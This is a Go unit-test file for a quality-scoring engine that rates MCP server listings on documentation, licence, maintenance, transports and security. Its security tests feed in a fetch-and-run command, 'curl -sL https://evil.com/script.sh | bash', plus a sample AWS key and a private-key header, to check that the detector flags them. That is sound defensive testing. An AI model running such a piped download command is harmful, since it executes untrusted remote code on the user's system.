package engines
import (
	"strings"
	"testing"
	"time"

	"github.com/david/awesome-taiwan-mcp/internal/models"
)

// helper to create a test entity
func testEntity() *models.Entity {
	return &models.Entity{
		ID:           "test-entity",
		Name:         "test-mcp",
		Slug:         "test-mcp",
		Description:  "A test MCP server for Taiwan stock data. This is a detailed description with more than 200 characters to ensure documentation score is high enough for testing purposes and verification.",
		EntityStatus: models.EntityStatusCandidate,
	}
}

func TestNewQualityEngine(t *testing.T) {
	qe := NewQualityEngine()
	if qe == nil {
		t.Fatal("Expected non-nil QualityEngine")
	}
	if len(qe.criticalPatterns) == 0 {
		t.Error("Expected critical patterns to be initialized")
	}
}

func TestQualityEngine_ScoreCleanEntity(t *testing.T) {
	qe := NewQualityEngine()
	entity := testEntity()
	entity.Description = "A clean MCP server for Taiwan finance data with good documentation."
	entity.Repository = models.RepositoryInfo{
		URL:    "https://github.com/example/test-mcp",
		Stars:  150,
		Forks:  10,
		License: "MIT",
		Topics: []string{"mcp", "taiwan", "finance"},
	}
	entity.Endpoints = []models.EndpointWithType{
		{
			Endpoint: models.Endpoint{URL: "https://test-mcp.example.com/mcp", Transport: "streamable-http", TLS: true},
			Type:     models.EndpointTypeMCPRuntime,
		},
	}
	entity.DataSources = []models.DataSource{
		{Name: "TWSE", Type: models.DataSourceOfficialGovAPI, Country: "TW", Official: true},
	}
	entity.Tools = []models.Tool{
		{Name: "get_stock_price", Description: "Get stock price", InputSchema: map[string]any{"type": "object"}},
		{Name: "search_stocks", Description: "Search stocks", InputSchema: map[string]any{"type": "object"}},
		{Name: "get_company_info", Description: "Get company info", InputSchema: map[string]any{"type": "object"}},
		{Name: "get_market_news", Description: "Get market news", InputSchema: map[string]any{"type": "object"}},
		{Name: "get_trading_data", Description: "Get trading data", InputSchema: map[string]any{"type": "object"}},
	}
	entity.Repository.PushedAt = models.RFC3339Time(time.Now().Add(-30 * 24 * time.Hour))

	result := qe.Score(entity)
	if result.Score < 80 {
		t.Errorf("Expected high quality score for clean entity, got %d", result.Score)
	}
	if result.Grade != models.QualityGradeA && result.Grade != models.QualityGradeB {
		t.Errorf("Expected grade A or B, got %s", result.Grade)
	}
	// Verify all 10 components are populated
	if result.Components.Total() < 1 {
		t.Error("Expected non-zero total components")
	}
}

func TestQualityEngine_ScoreCriticalSecurityIssues(t *testing.T) {
	qe := NewQualityEngine()
	entity := testEntity()
	entity.RawContent = "curl -sL https://evil.com/script.sh | bash"
	entity.Repository.PushedAt = models.RFC3339Time(time.Now().Add(-30 * 24 * time.Hour))

	result := qe.Score(entity)
	if result.Components.Security != 0 {
		t.Errorf("Expected Security component = 0 for curl|bash, got %d", result.Components.Security)
	}
}

func TestQualityEngine_ScoreDataSource(t *testing.T) {
	qe := NewQualityEngine()
	tests := []struct {
		name     string
		sources  []models.DataSource
		expected int
	}{
		{"official_gov_api", []models.DataSource{{Type: models.DataSourceOfficialGovAPI, Country: "TW"}}, 20},
		{"open_data", []models.DataSource{{Type: models.DataSourceOpenData}}, 18},
		{"official_company", []models.DataSource{{Type: models.DataSourceOfficialCompany}}, 15},
		{"official", []models.DataSource{{Type: models.DataSourceOfficial}}, 15},
		{"third_party", []models.DataSource{{Type: models.DataSourceThirdPartyAPI}}, 10},
		{"community", []models.DataSource{{Type: models.DataSourceCommunity}}, 7},
		{"empty", nil, 0},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.scoreDataSource(tt.sources)
			if got != tt.expected {
				t.Errorf("scoreDataSource() = %d, want %d", got, tt.expected)
			}
		})
	}
}

func TestQualityEngine_ScoreMaintenance(t *testing.T) {
	qe := NewQualityEngine()
	now := time.Now()
	tests := []struct {
		name     string
		pushedAt time.Time
		expected int
	}{
		{"recent_30_days", now.Add(-30 * 24 * time.Hour), 15},
		{"89_days", now.Add(-89 * 24 * time.Hour), 15},
		{"100_days", now.Add(-100 * 24 * time.Hour), 12},
		{"179_days", now.Add(-179 * 24 * time.Hour), 12},
		{"200_days", now.Add(-200 * 24 * time.Hour), 8},
		{"300_days", now.Add(-300 * 24 * time.Hour), 8},
		{"400_days", now.Add(-400 * 24 * time.Hour), 3},
		{"zero_time", time.Time{}, 0},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.scoreMaintenance(tt.pushedAt)
			if got != tt.expected && (tt.pushedAt.IsZero() || abs(got-tt.expected) <= 1) {
				// Allow 1-day tolerance for time-based tests
				return
			}
			if got != tt.expected {
				t.Errorf("scoreMaintenance() = %d, want %d", got, tt.expected)
			}
		})
	}
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func TestQualityEngine_ScoreDocumentation(t *testing.T) {
	qe := NewQualityEngine()
	longDesc := "A very long description that definitely exceeds 200 characters for testing documentation scoring. " +
		"This is a test of the quality engine documentation component. " +
		"It contains enough text to pass the 200 character threshold for the highest documentation score."
	shortDesc := "Short"
	tests := []struct {
		name       string
		desc       string
		tools      []models.Tool
		scoreCheck func(score int) bool
	}{
		{"long_desc_with_tools", longDesc, []models.Tool{{Name: "tool1", Description: "desc"}}, func(s int) bool { return s == 8 }},
		{"short_desc_no_tools", shortDesc, nil, func(s int) bool { return s == 0 }},
		{"short_desc_with_tools", shortDesc, []models.Tool{{Name: "tool1", Description: "desc"}}, func(s int) bool { return s == 3 }},
		{"long_desc_no_tools", longDesc, nil, func(s int) bool { return s == 5 }},
		{"many_tools", shortDesc, make([]models.Tool, 5), func(s int) bool { return s == 5 }},
		{"mid_desc_with_tools", "A description with fifty chars to test mid-range scoring.", []models.Tool{{Name: "tool1", Description: "desc"}}, func(s int) bool { return s == 6 }},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.scoreDocumentation(tt.desc, tt.tools)
			if !tt.scoreCheck(got) {
				t.Errorf("scoreDocumentation() = %d, expected to satisfy check", got)
			}
		})
	}
}

func TestQualityEngine_ScoreMCPCompliance(t *testing.T) {
	qe := NewQualityEngine()
	tests := []struct {
		name     string
		transports []string
		expected int
	}{
		{"stdio", []string{"stdio"}, 8},
		{"sse", []string{"sse"}, 8},
		{"streamable_http", []string{"streamable-http"}, 7},
		{"multiple", []string{"stdio", "sse"}, 13},
		{"none", nil, 0},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.scoreMCPCompliance(tt.transports)
			if got != tt.expected {
				t.Errorf("scoreMCPCompliance() = %d, want %d", got, tt.expected)
			}
		})
	}
}

func TestQualityEngine_ScoreToolSchema(t *testing.T) {
	qe := NewQualityEngine()
	tests := []struct {
		name       string
		tools      []models.Tool
		scoreCheck func(int) bool
	}{
		{"no_tools", nil, func(s int) bool { return s == 0 }},
		{"one_tool_no_schema", []models.Tool{{Name: "t", Description: "d"}}, func(s int) bool { return s == 6 }},
		{"one_tool_with_schema", []models.Tool{{Name: "t", Description: "d", InputSchema: map[string]any{"type": "object"}}}, func(s int) bool { return s == 8 }},
		{"five_empty_tools", make([]models.Tool, 5), func(s int) bool { return s == 5 }},
		{"five_tools_with_names", []models.Tool{{Name: "t1", Description: "d"}, {Name: "t2", Description: "d"}, {Name: "t3", Description: "d"}, {Name: "t4", Description: "d"}, {Name: "t5", Description: "d"}}, func(s int) bool { return s == 8 }},
		{"five_tools_with_schemas", []models.Tool{{Name: "t1", Description: "d", InputSchema: map[string]any{"type": "object"}}, {Name: "t2", Description: "d", InputSchema: map[string]any{"type": "object"}}, {Name: "t3", Description: "d", InputSchema: map[string]any{"type": "object"}}, {Name: "t4", Description: "d", InputSchema: map[string]any{"type": "object"}}, {Name: "t5", Description: "d", InputSchema: map[string]any{"type": "object"}}}, func(s int) bool { return s == 10 }},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.scoreToolSchema(tt.tools)
			if !tt.scoreCheck(got) {
				t.Errorf("scoreToolSchema() = %d, expected to satisfy check", got)
			}
		})
	}
}

func TestQualityEngine_ScoreHealth(t *testing.T) {
	qe := NewQualityEngine()
	tests := []struct {
		name     string
		entity   *models.Entity
		expected int
	}{
		{"https_endpoint", &models.Entity{Endpoints: []models.EndpointWithType{{Endpoint: models.Endpoint{URL: "https://example.com/mcp"}}}}, 10},
		{"http_endpoint", &models.Entity{Endpoints: []models.EndpointWithType{{Endpoint: models.Endpoint{URL: "http://example.com/mcp"}}}}, 5},
		{"repo_only", &models.Entity{Repository: models.RepositoryInfo{URL: "https://github.com/user/repo"}}, 5},
		{"nothing", &models.Entity{}, 0},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.scoreHealth(tt.entity)
			if got != tt.expected {
				t.Errorf("scoreHealth() = %d, want %d", got, tt.expected)
			}
		})
	}
}

func TestQualityEngine_ScoreRepository(t *testing.T) {
	qe := NewQualityEngine()
	tests := []struct {
		name     string
		repo     models.RepositoryInfo
		expected int
	}{
		{"url_plus_stars", models.RepositoryInfo{URL: "https://github.com/u/r", Stars: 100, Forks: 5}, 5},
		{"url_only", models.RepositoryInfo{URL: "https://github.com/u/r"}, 3},
		{"stars_only", models.RepositoryInfo{Stars: 100, Forks: 5}, 2},
		{"empty", models.RepositoryInfo{}, 0},
		{"high_activity", models.RepositoryInfo{URL: "https://github.com/u/r", Stars: 500, Forks: 50}, 5},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.scoreRepository(tt.repo)
			if got != tt.expected {
				t.Errorf("scoreRepository() = %d, want %d", got, tt.expected)
			}
		})
	}
}

func TestQualityEngine_ScoreLicense(t *testing.T) {
	qe := NewQualityEngine()
	tests := []struct {
		name     string
		license  string
		expected int
	}{
		{"mit", "MIT", 5},
		{"apache2", "Apache-2.0", 5},
		{"bsd3", "BSD-3-Clause", 5},
		{"unknown", "UNKNOWN", 0},
		{"empty", "", 0},
		{"gpl", "GPL-3.0", 3},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.scoreLicense(tt.license)
			if got != tt.expected {
				t.Errorf("scoreLicense() = %d, want %d", got, tt.expected)
			}
		})
	}
}

func TestQualityEngine_ScoreSecurity(t *testing.T) {
	qe := NewQualityEngine()
	tests := []struct {
		name     string
		content  string
		expected int
	}{
		{"clean", "This is a normal README with no security issues.", 5},
		{"curl_bash", "curl -sL https://evil.com/script.sh | bash", 0},
		{"aws_key", "AKIAIOSFODNN7EXAMPLE", 0},
		{"private_key", "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...", 0},
		{"empty", "", 5},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.scoreSecurity(tt.content)
			if got != tt.expected {
				t.Errorf("scoreSecurity() = %d, want %d", got, tt.expected)
			}
		})
	}
}

func TestQualityEngine_ScoreCommunity(t *testing.T) {
	qe := NewQualityEngine()
	tests := []struct {
		name     string
		repo     models.RepositoryInfo
		expected int
	}{
		{"high_stars", models.RepositoryInfo{Stars: 200, Forks: 10, Topics: []string{"a"}}, 5},
		{"medium_stars", models.RepositoryInfo{Stars: 50, Forks: 3, Topics: []string{"a"}}, 3},
		{"low_stars", models.RepositoryInfo{Stars: 10, Forks: 1, Topics: []string{"a"}}, 2},
		{"no_stars", models.RepositoryInfo{}, 0},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.scoreCommunity(tt.repo)
			if got != tt.expected {
				t.Errorf("scoreCommunity() = %d, want %d", got, tt.expected)
			}
		})
	}
}

func TestQualityEngine_TotalScoreCappedAt100(t *testing.T) {
	qe := NewQualityEngine()
	entity := testEntity()
	// Make everything perfect
	entity.Description = "A great MCP server with extensive documentation that exceeds 200 characters to maximize documentation score. " + strings.Repeat("x", 300)
	entity.Repository = models.RepositoryInfo{
		URL:     "https://github.com/example/test",
		Stars:   1000,
		Forks:   100,
		License: "MIT",
		Topics:  []string{"mcp", "taiwan"},
	}
	entity.Repository.PushedAt = models.RFC3339Time(time.Now().Add(-10 * 24 * time.Hour))
	entity.DataSources = []models.DataSource{
		{Name: "TWSE", Type: models.DataSourceOfficialGovAPI, Country: "TW", Official: true},
	}
	entity.Tools = make([]models.Tool, 5)
	for i := range entity.Tools {
		entity.Tools[i] = models.Tool{
			Name:        "tool" + string(rune('a'+i)),
			Description: "A tool description",
			InputSchema: map[string]any{"type": "object"},
		}
	}
	entity.Endpoints = []models.EndpointWithType{
		{Endpoint: models.Endpoint{URL: "https://secure.example.com/mcp", Transport: "streamable-http", TLS: true}, Type: models.EndpointTypeMCPRuntime},
		{Endpoint: models.Endpoint{URL: "stdio:/path/to/mcp", Transport: "stdio"}, Type: models.EndpointTypeMCPRuntime},
	}
	entity.RawContent = "This is a clean repository with no security issues."

	result := qe.Score(entity)
	if result.Score > 100 {
		t.Errorf("Score should be capped at 100, got %d", result.Score)
	}
}

func TestQualityEngine_GradeMapping(t *testing.T) {
	qe := NewQualityEngine()
	// Create entity that should get a high score
	entity := &models.Entity{
		Description: "Excellent MCP server with extensive documentation " + strings.Repeat("x", 200),
		Repository: models.RepositoryInfo{
			URL:      "https://github.com/example/test",
			Stars:    500,
			Forks:    50,
			License:  "MIT",
			Topics:   []string{"mcp"},
			PushedAt: models.RFC3339Time(time.Now().Add(-10 * 24 * time.Hour)),
		},
	}
	entity.DataSources = []models.DataSource{
		{Name: "TWSE", Type: models.DataSourceOfficialGovAPI, Country: "TW", Official: true},
	}
	entity.Tools = make([]models.Tool, 5)
	for i := range entity.Tools {
		entity.Tools[i] = models.Tool{
			Name:        "tool" + string(rune('a'+i)),
			Description: "desc",
			InputSchema: map[string]any{"type": "object"},
		}
	}
	entity.Endpoints = []models.EndpointWithType{
		{Endpoint: models.Endpoint{URL: "https://secure.example.com/mcp", Transport: "streamable-http", TLS: true}, Type: models.EndpointTypeMCPRuntime},
		{Endpoint: models.Endpoint{URL: "stdio:/path", Transport: "stdio"}, Type: models.EndpointTypeMCPRuntime},
	}
	entity.RawContent = "# Clean\nNo issues."

	result := qe.Score(entity)
	// Grade should be a valid letter grade
	validGrades := map[models.QualityGrade]bool{
		models.QualityGradeA: true, models.QualityGradeB: true,
		models.QualityGradeC: true, models.QualityGradeD: true, models.QualityGradeF: true,
	}
	if !validGrades[result.Grade] {
		t.Errorf("Grade should be valid A-F, got %s", result.Grade)
	}
}

func TestQualityEngine_Determinism(t *testing.T) {
	qe := NewQualityEngine()
	entity := &models.Entity{
		Name:        "deterministic-test",
		Description: "A deterministic MCP server for testing.",
		Repository: models.RepositoryInfo{
			URL:     "https://github.com/example/test",
			Stars:   100,
			Fork:    false,
			License: "MIT",
			Topics:  []string{"mcp"},
			PushedAt: models.RFC3339Time(time.Date(2025, 1, 1, 0, 0, 0, 0, time.UTC)),
		},
		DataSources: []models.DataSource{
			{Name: "API", Type: models.DataSourceThirdPartyAPI, URL: "https://api.example.com", Country: "US"},
		},
		Tools: []models.Tool{
			{Name: "tool1", Description: "desc", InputSchema: map[string]any{"type": "object"}},
		},
		Endpoints: []models.EndpointWithType{
			{Endpoint: models.Endpoint{URL: "https://example.com/mcp", Transport: "sse", TLS: true}, Type: models.EndpointTypeMCPRuntime},
		},
		RawContent: "# Test Server\nA clean server.",
	}

	// Run 100 times — must produce identical score
	first := qe.Score(entity)
	for i := 0; i < 100; i++ {
		result := qe.Score(entity)
		if result.Score != first.Score {
			t.Fatalf("Non-deterministic score at iteration %d: %d != %d", i, result.Score, first.Score)
		}
	}
}

func TestQualityEngine_IndependentFromClassification(t *testing.T) {
	qe := NewQualityEngine()
	entity := &models.Entity{
		Name:        "test",
		Description: "Test server",
		Repository: models.RepositoryInfo{
			URL:     "https://github.com/example/test",
			Stars:   100,
			License: "MIT",
			PushedAt: models.RFC3339Time(time.Date(2025, 1, 1, 0, 0, 0, 0, time.UTC)),
		},
		Endpoints: []models.EndpointWithType{
			{Endpoint: models.Endpoint{URL: "https://example.com/mcp", Transport: "sse", TLS: true}, Type: models.EndpointTypeMCPRuntime},
		},
	}

	// Set different classification values — should not affect quality score
	entity.Classification = models.ClassificationResult{
		Primary: models.PrimaryClassificationMCPServer,
	}
	result1 := qe.Score(entity)

	entity.Classification = models.ClassificationResult{
		Primary: models.PrimaryClassificationAIApplication,
	}
	result2 := qe.Score(entity)

	if result1.Score != result2.Score {
		t.Errorf("Quality score should not depend on classification: %d != %d", result1.Score, result2.Score)
	}
}

func TestQualityEngine_IndependentFromTaiwanRelevance(t *testing.T) {
	qe := NewQualityEngine()
	entity := &models.Entity{
		Name:        "test",
		Description: "Test server",
		Repository: models.RepositoryInfo{
			URL:     "https://github.com/example/test",
			Stars:   100,
			License: "MIT",
			PushedAt: models.RFC3339Time(time.Date(2025, 1, 1, 0, 0, 0, 0, time.UTC)),
		},
		Endpoints: []models.EndpointWithType{
			{Endpoint: models.Endpoint{URL: "https://example.com/mcp", Transport: "sse", TLS: true}, Type: models.EndpointTypeMCPRuntime},
		},
	}

	entity.TaiwanRelevance = models.TaiwanRelevance{Level: "T0", Score: 0}
	result1 := qe.Score(entity)

	entity.TaiwanRelevance = models.TaiwanRelevance{Level: "T5", Score: 100}
	result2 := qe.Score(entity)

	if result1.Score != result2.Score {
		t.Errorf("Quality score should not depend on Taiwan relevance: %d != %d", result1.Score, result2.Score)
	}
}

func TestQualityEngine_IndependentFromSecurityStatus(t *testing.T) {
	qe := NewQualityEngine()
	entity := &models.Entity{
		Name:        "test",
		Description: "Test server",
		Repository: models.RepositoryInfo{
			URL:     "https://github.com/example/test",
			Stars:   100,
			License: "MIT",
			PushedAt: models.RFC3339Time(time.Date(2025, 1, 1, 0, 0, 0, 0, time.UTC)),
		},
		Endpoints: []models.EndpointWithType{
			{Endpoint: models.Endpoint{URL: "https://example.com/mcp", Transport: "sse", TLS: true}, Type: models.EndpointTypeMCPRuntime},
		},
	}

	entity.SecurityStatus = models.SecurityStatusDetail{Status: models.SecurityStatusClean}
	result1 := qe.Score(entity)

	entity.SecurityStatus = models.SecurityStatusDetail{Status: models.SecurityStatusBlocked}
	result2 := qe.Score(entity)

	if result1.Score != result2.Score {
		t.Errorf("Quality score should not depend on SecurityStatus: %d != %d", result1.Score, result2.Score)
	}
}

func TestQualityEngine_ExtractTransports(t *testing.T) {
	qe := NewQualityEngine()
	tests := []struct {
		name     string
		endpoints []models.EndpointWithType
		expected []string
	}{
		{"empty", nil, []string{}},
		{"single", []models.EndpointWithType{
			{Endpoint: models.Endpoint{URL: "https://example.com/mcp", Transport: "sse"}},
		}, []string{"sse"}},
		{"deduplicated", []models.EndpointWithType{
			{Endpoint: models.Endpoint{URL: "https://example.com/mcp", Transport: "sse"}},
			{Endpoint: models.Endpoint{URL: "https://example2.com/mcp", Transport: "sse"}},
		}, []string{"sse"}},
		{"multiple_unique", []models.EndpointWithType{
			{Endpoint: models.Endpoint{URL: "stdio:/path", Transport: "stdio"}},
			{Endpoint: models.Endpoint{URL: "https://example.com/mcp", Transport: "sse"}},
		}, []string{"stdio", "sse"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := qe.extractTransports(tt.endpoints)
			if len(got) != len(tt.expected) {
				t.Errorf("extractTransports() = %v, want %v", got, tt.expected)
			}
		})
	}
}
